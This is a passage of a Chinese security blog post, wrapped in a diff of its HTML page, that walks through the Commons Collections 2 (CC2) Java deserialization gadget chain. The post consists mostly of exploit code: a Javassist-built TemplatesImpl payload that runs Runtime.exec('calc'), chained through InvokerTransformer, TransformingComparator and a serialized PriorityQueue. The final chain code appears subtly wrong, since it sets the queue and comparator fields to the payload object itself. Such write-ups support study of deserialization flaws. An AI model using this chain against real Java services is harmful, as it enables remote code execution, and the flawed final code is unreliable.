+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250816162537985.png"
+                      alt="image-20250816162537985"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250816162555676.png"
+                      alt="image-20250816162555676"
+                ></p>
+<p>所以我们有了</p>
+<h2 id="条件3："><a href="#条件3：" class="headerlink" title="条件3："></a>条件3：</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">superClass.getName().equals(ABSTRACT_TRANSLET)</span><br></pre></td></tr></table></figure></div>
+
+<p>回到匿名类的run方法</p>
+<p>观察到_tfactory 默认是个null所以当调用_tfactory.getExternalExtensionsMap() 时会出先报错 所以我们还得反射重新设置一下他</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250816172708759.png"
+                      alt="image-20250816172708759"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250816172727210.png"
+                      alt="image-20250816172727210"
+                ></p>
+<h2 id="条件4："><a href="#条件4：" class="headerlink" title="条件4："></a>条件4：</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tfactory 不是 null</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>回到getTransletInstance方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250816162801731.png"
+                      alt="image-20250816162801731"
+                ></p>
+<p>在调用完了defineTransletClasses 方法后就会进行实例化</p>
+<p>那么现在我们尝试构造一下</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">@Test</span><br><span class="line">public void hack1() throws CannotCompileException, IOException, NotFoundException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line"></span><br><span class="line">    ClassPool pool = ClassPool.getDefault();</span><br><span class="line">    CtClass ctClass = pool.makeClass(&quot;hacker&quot;);</span><br><span class="line">    CtConstructor noArgConstructor = new CtConstructor(new CtClass[0], ctClass);</span><br><span class="line">    noArgConstructor.setBody(&quot;&#123;Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;);</span><br><span class="line">    ctClass.addConstructor(noArgConstructor);</span><br><span class="line"></span><br><span class="line">    //满足条件3</span><br><span class="line">    CtClass ancestor = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);</span><br><span class="line">    ctClass.setSuperclass(ancestor);</span><br><span class="line"></span><br><span class="line">    byte[] bytecode = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //满足条件1</span><br><span class="line">    Class&lt;? extends  TemplatesImpl&gt; clazz = TemplatesImpl.class;</span><br><span class="line">    TemplatesImpl ob = clazz.newInstance();</span><br><span class="line">    Field _name = clazz.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">    _name.setAccessible(true);</span><br><span class="line">    _name.set(ob, &quot;test&quot;);</span><br><span class="line">    //满足条件2</span><br><span class="line">    Field _bytecodes = clazz.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">    _bytecodes.setAccessible(true);</span><br><span class="line">    _bytecodes.set(ob, new byte[][]&#123;bytecode&#125;);  // 必须是二维数组</span><br><span class="line"></span><br><span class="line">    //满足条件4</span><br><span class="line">    TransformerFactoryImpl transformerFactory = new TransformerFactoryImpl();</span><br><span class="line">    Field _tfactory = clazz.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">    _tfactory.setAccessible(true);</span><br><span class="line">    _tfactory.set(ob, transformerFactory);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Method transform = clazz.getDeclaredMethod(&quot;newTransformer&quot;);</span><br><span class="line">    transform.setAccessible(true);</span><br><span class="line">    transform.invoke(ob);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250816172947683.png"
+                      alt="image-20250816172947683"
+                ></p>
+<p>成功调用计算器</p>
+<p>那么我们就要找找在哪里会调用newTransformer这个方法</p>
+<p>我们自然而然可以想到InvokerTransformer来调用</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass ctClass = pool.makeClass(&quot;hacker&quot;);</span><br><span class="line">        CtConstructor noArgConstructor = new CtConstructor(new CtClass[0], ctClass);</span><br><span class="line">        noArgConstructor.setBody(&quot;&#123;Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;);</span><br><span class="line">        ctClass.addConstructor(noArgConstructor);</span><br><span class="line"></span><br><span class="line">        //满足条件3</span><br><span class="line">        CtClass ancestor = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);</span><br><span class="line">        ctClass.setSuperclass(ancestor);</span><br><span class="line"></span><br><span class="line">        byte[] bytecode = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        //满足条件1</span><br><span class="line">        Class&lt;? extends  TemplatesImpl&gt; clazz = TemplatesImpl.class;</span><br><span class="line">        TemplatesImpl ob = clazz.newInstance();</span><br><span class="line">        Field _name = clazz.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        _name.setAccessible(true);</span><br><span class="line">        _name.set(ob, &quot;test&quot;);</span><br><span class="line">        //满足条件2</span><br><span class="line">        Field _bytecodes = clazz.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        _bytecodes.setAccessible(true);</span><br><span class="line">        _bytecodes.set(ob, new byte[][]&#123;bytecode&#125;);  // 必须是二维数组</span><br><span class="line"></span><br><span class="line">        //满足条件4</span><br><span class="line">        TransformerFactoryImpl transformerFactory = new TransformerFactoryImpl();</span><br><span class="line">        Field _tfactory = clazz.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">        _tfactory.setAccessible(true);</span><br><span class="line">        _tfactory.set(ob, transformerFactory);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[0], new Object[0]);</span><br><span class="line">        invokerTransformer.transform(ob);</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250816173751003.png"
+                      alt="image-20250816173751003"
+                ></p>
+<p>然后找找哪里会调用transform方法</p>
+<p>TransformingComparator里的compare 有调用</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250816174335351.png"
+                      alt="image-20250816174335351"
+                ></p>
+<p>并且this.transformer 是可控的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250816174348644.png"
+                      alt="image-20250816174348644"
+                ></p>
+<p>所以进一步构造链子</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass ctClass = pool.makeClass(&quot;hacker&quot;);</span><br><span class="line">        CtConstructor noArgConstructor = new CtConstructor(new CtClass[0], ctClass);</span><br><span class="line">        noArgConstructor.setBody(&quot;&#123;Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;);</span><br><span class="line">        ctClass.addConstructor(noArgConstructor);</span><br><span class="line"></span><br><span class="line">        //满足条件3</span><br><span class="line">        CtClass ancestor = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);</span><br><span class="line">        ctClass.setSuperclass(ancestor);</span><br><span class="line"></span><br><span class="line">        byte[] bytecode = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        //满足条件1</span><br><span class="line">        Class&lt;? extends  TemplatesImpl&gt; clazz = TemplatesImpl.class;</span><br><span class="line">        TemplatesImpl ob = clazz.newInstance();</span><br><span class="line">        Field _name = clazz.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        _name.setAccessible(true);</span><br><span class="line">        _name.set(ob, &quot;test&quot;);</span><br><span class="line">        //满足条件2</span><br><span class="line">        Field _bytecodes = clazz.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        _bytecodes.setAccessible(true);</span><br><span class="line">        _bytecodes.set(ob, new byte[][]&#123;bytecode&#125;);  // 必须是二维数组</span><br><span class="line"></span><br><span class="line">        //满足条件4</span><br><span class="line">        TransformerFactoryImpl transformerFactory = new TransformerFactoryImpl();</span><br><span class="line">        Field _tfactory = clazz.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">        _tfactory.setAccessible(true);</span><br><span class="line">        _tfactory.set(ob, transformerFactory);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[0], new Object[0]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer);</span><br><span class="line">        transformingComparator.compare(ob, &#x27;1&#x27;);</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250816174610775.png"
+                      alt="image-20250816174610775"
+                ></p>
+<p>找找哪里调用了compare方法</p>
+<p>在PriorityQueue 类中就有调用compare的方法</p>
+<p>我们看看他的readobject方法 调用了heapify </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250816180147388.png"
+                      alt="image-20250816180147388"
+                ></p>
+<p>跟进heapify 方法 调用了siftDown方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250816180224553.png"
+                      alt="image-20250816180224553"
+                ></p>
+<p>跟进siftDown 方法 这里我们能反射设置他的comparator 所以 comparator不为null 所以 会调用siftDownUsingComparator</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250816180254049.png"
+                      alt="image-20250816180254049"
+                ></p>
+<p>跟进siftDownUsingComparator方法 最终调用了compare方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../images/image-20250816180446040.png"
+                      alt="image-20250816180446040"
+                ></p>
+<p>所以我们最终能构造出链子</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">@Test</span><br><span class="line">public void hack2() throws CannotCompileException, IOException, NotFoundException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">    ClassPool pool = ClassPool.getDefault();</span><br><span class="line">    CtClass ctClass = pool.makeClass(&quot;hacker&quot;);</span><br><span class="line">    CtConstructor noArgConstructor = new CtConstructor(new CtClass[0], ctClass);</span><br><span class="line">    noArgConstructor.setBody(&quot;&#123;Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;);</span><br><span class="line">    ctClass.addConstructor(noArgConstructor);</span><br><span class="line"></span><br><span class="line">    //满足条件3</span><br><span class="line">    CtClass ancestor = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);</span><br><span class="line">    ctClass.setSuperclass(ancestor);</span><br><span class="line"></span><br><span class="line">    byte[] bytecode = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //满足条件1</span><br><span class="line">    Class&lt;? extends  TemplatesImpl&gt; clazz = TemplatesImpl.class;</span><br><span class="line">    TemplatesImpl ob = clazz.newInstance();</span><br><span class="line">    Field _name = clazz.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">    _name.setAccessible(true);</span><br><span class="line">    _name.set(ob, &quot;test&quot;);</span><br><span class="line">    //满足条件2</span><br><span class="line">    Field _bytecodes = clazz.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">    _bytecodes.setAccessible(true);</span><br><span class="line">    _bytecodes.set(ob, new byte[][]&#123;bytecode&#125;);  // 必须是二维数组</span><br><span class="line"></span><br><span class="line">    //满足条件4</span><br><span class="line">    TransformerFactoryImpl transformerFactory = new TransformerFactoryImpl();</span><br><span class="line">    Field _tfactory = clazz.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">    _tfactory.setAccessible(true);</span><br><span class="line">    _tfactory.set(ob, transformerFactory);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[0], new Object[0]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer);</span><br><span class="line">    transformingComparator.compare(ob, &#x27;1&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    PriorityQueue priorityQueue = new PriorityQueue(2);</span><br><span class="line">    //先设置为正常变量值，后面可以通过setFieldValue修改</span><br><span class="line">    priorityQueue.add(1);</span><br><span class="line">    priorityQueue.add(1);</span><br><span class="line"></span><br><span class="line">    Object[] objects = new Object[]&#123;ob, ob&#125;;</span><br><span class="line">    Class&lt; ?&gt; clazz1 = Class.forName(&quot;java.util.PriorityQueue&quot;);</span><br><span class="line">    Field _queue = clazz1.getDeclaredField(&quot;queue&quot;);</span><br><span class="line">    _queue.setAccessible(true);</span><br><span class="line">    _queue.set(priorityQueue, ob);</span><br><span class="line"></span><br><span class="line">    Field comparator = clazz1.getDeclaredField(&quot;comparator&quot;);</span><br><span class="line">    comparator.setAccessible(true);</span><br><span class="line">    comparator.set(priorityQueue, ob);</span><br><span class="line"></span><br><span class="line">    SerializationUtils.serializeToFile(priorityQueue);</span><br><span class="line">    SerializationUtils.deserializeFromFile(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>调用逻辑</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-&gt;PriorityQueue.readObject()</span><br><span class="line">      -&gt;PriorityQueue.heapify()</span><br><span class="line">          -&gt;PriorityQueue.siftDown()</span><br><span class="line">            -&gt;PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                -&gt;TransformingComparator.compare()</span><br><span class="line">                    -&gt;InvokerTransformer.transform()</span><br><span class="line">                        -&gt;TemplatesImpl.newTransformer()</span><br><span class="line">                        -&gt;…………</span><br></pre></td></tr></table></figure></div>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> cc2链调用</li>
+        <li><strong>Author:</strong> UWI</li>
+        <li><strong>Created at
+                :</strong> 2025-08-15 08:49:48</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-08-16 18:10:17
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://nbwsws.github.io/2025/08/15/代码审计/cc2/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/java/">#java</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/08/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/servlet%E5%86%85%E5%AD%98%E9%A9%AC/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">servlet内存马</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+                    lang: 'zh-CN',
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">cc2链调用</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9C%80%E8%A6%81%E5%BC%95%E5%85%A5"><span class="nav-text">需要引入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E5%88%9B%E5%BB%BA%E7%B1%BB"><span class="nav-text">动态创建类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B61"><span class="nav-text">条件1.</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B62%EF%BC%9A"><span class="nav-text">条件2：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B63%EF%BC%9A"><span class="nav-text">条件3：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B64%EF%BC%9A"><span class="nav-text">条件4：</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">UWI</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        17 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
